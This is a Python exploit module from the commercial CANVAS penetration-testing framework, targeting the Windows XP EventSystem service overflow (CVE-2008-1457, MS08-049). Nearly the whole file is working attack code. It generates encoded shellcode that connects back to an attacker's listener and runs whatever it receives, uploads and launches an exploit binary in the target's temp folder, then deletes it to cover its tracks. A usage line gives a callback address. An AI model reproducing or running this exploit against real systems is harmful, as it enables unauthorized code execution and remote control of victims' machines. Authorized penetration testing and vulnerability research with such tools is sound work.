#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path:
    sys.path.append('.')

import socket
import time
import struct
import base64

from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localexploit import LocalExploit
from shelllistener import *
from MOSDEF import mosdef
import canvasengine

NAME='EventSystem Service Overflow'
DESCRIPTION='Vulnerabilities in Event System Could Allow Remote Code Execution'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Repeatability']='One Shot'
DOCUMENTATION['CVE Name']='CVE-2008-1457'
DOCUMENTATION['CVE Url']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1457'
DOCUMENTATION['CVSS'] = 9.0
DOCUMENTATION['MSRC']='http://www.microsoft.com/technet/security/bulletin/ms08-049.mspx'
DOCUMENTATION['Date public']='08/12/2008'
DOCUMENTATION['Notes']='Due to the fact that the svchost.exe instance where the EventSystem service is running is DEP protected, and that all loaded DLLs have GS cookies and SafeSEH enabled, the stack overflow can only be exploit when DEP is AlwaysOff (at least at the current state of our knowledge)'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Local'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP']
PROPERTY['MSADV']='MS08-049'
PROPERTY['MS PATCHES']=["KB950974"]

NOTES="""
"""

TODO="""
Usage:
Win32/MOSDEF$ runmodule ms08_049 -l 10.10.10.240 -d 5556
"""

from encoder import chunkedaddencoder
from shellcode import shellcodeGenerator

targets={
    0: ['Autoversioning',0],
}

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name=NAME
        self.upload_filename='Resources/ms08_049.exe'
        self.remote_filename=''
        self.result=0
        self.badstring='\0\xff'
        self.listenerArgsDict['fromcreatethread']=1
        self.use_local_interface = False

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        sc=shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp',{'subespval':0})
        sc.addAttr('revert_to_self_before_importing_ws2_32',None)
        sc.addAttr('tcpconnect',{'port':self.callback.port,'ipaddress':self.callback.ip})
        sc.addAttr('CreateThreadRecvExecWin32',{'socketreg':'FDSPOT'}) #MOSDEF
        sc.addAttr('ExitThread',None)
        rawshellcode=sc.get()
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.log('Encoding shellcode')
        shellcode=encoder.encode(rawshellcode)
        if shellcode=='':
            self.log('Problem encoding shellcode')
            raise Exception,'error encoding shellcode'
        self.shellcode=shellcode
        self.log('Total shellcode length=%d'%(len(self.shellcode)))
        return self.shellcode

    def run_attack(self,node):
        self.node=node #XXX: not needed?
        ret,nodeos=node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        self.log('Attacking Windows %d.%d'%(major,minor))
        if major!=5 and minor!=1:
            self.log('This exploit is only for Windows XP')
            return 0
        # Upload and execute the exploit with the shellcode as a commandline
        # argument.
        self.remote_filename = self.node.shell.GetTempPathA() + '\\%s.exe' % randomstring(8)
        ret=self.node.shell.upload(self.upload_filename,destfilename=self.remote_filename)
        if ret:
            self.shellcode+='A'*(3-(len(self.shellcode)%3))
            arguments=base64.b64encode(self.shellcode)
            ret=self.node.shell.dospawn('"%s" %s'%(self.remote_filename,arguments))
            self.log('DoSpawn Returned %s'%(ret))
        time.sleep(3)
        self.log('Removing uploaded file')
        self.node.shell.unlink(self.remote_filename)
        if self.ISucceeded():
            self.setInfo('Attacking Windows %d.%d done (success!)'%(major,minor))
            return 1
        else:
            self.setInfo('Attacking Windows %d.%d done (failed!)'%(major,minor))
        return 0

    def run(self):
        self.setInfo('%s (in progress)'%(NAME))
        success=0 
        for node in self.argsDict['passednodes']:
            if 'win32api' not in node.capabilities:
                self.log('Node %s not a Win32 node'%(node.getname()))
                continue
            ret=self.run_attack(node)
            if ret==1:
                success=1
        return success

if __name__=='__main__':
    print 'This win32 local module is meant to be run only within CANVAS'
